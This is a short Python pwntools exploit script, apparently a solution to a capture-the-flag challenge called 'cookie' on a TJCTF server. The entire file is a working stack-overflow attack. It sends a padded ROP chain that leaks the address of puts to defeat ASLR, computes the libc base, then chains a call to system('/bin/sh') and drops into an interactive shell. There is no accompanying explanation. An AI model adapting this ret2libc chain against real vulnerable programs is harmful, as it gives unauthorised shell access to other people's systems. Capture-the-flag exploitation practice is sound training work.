from pwn import *

e = ELF("./cookie")
libc = ELF("./libc.so.6")

context.binary = e.path

is_remote = "--remote" in sys.argv
def debug():
  if not is_remote:
    gdb.attach(p)

if is_remote:
  p = remote("p1.tjctf.org", 8010)
else:
  p = process(e.path)
  # {"LD_PRELOAD": libc.path})

rdi = 0x400933

p.sendlineafter("?", "A" * 0x58 + p64(rdi) + p64(e.got["puts"]) + p64(e.symbols["puts"]) + p64(e.symbols["main"]))
p.recvline()
p.recvline()

leak = u64(p.recvline(keepends=False).ljust(8, "\x00")) - libc.symbols["puts"]

print(hex(leak))

p.sendlineafter("?", "A" * 0x58 + p64(rdi + 1) + p64(rdi) + p64(leak + next(libc.search("/bin/sh"))) + p64(leak + libc.symbols["system"]))

debug()

p.interactive()
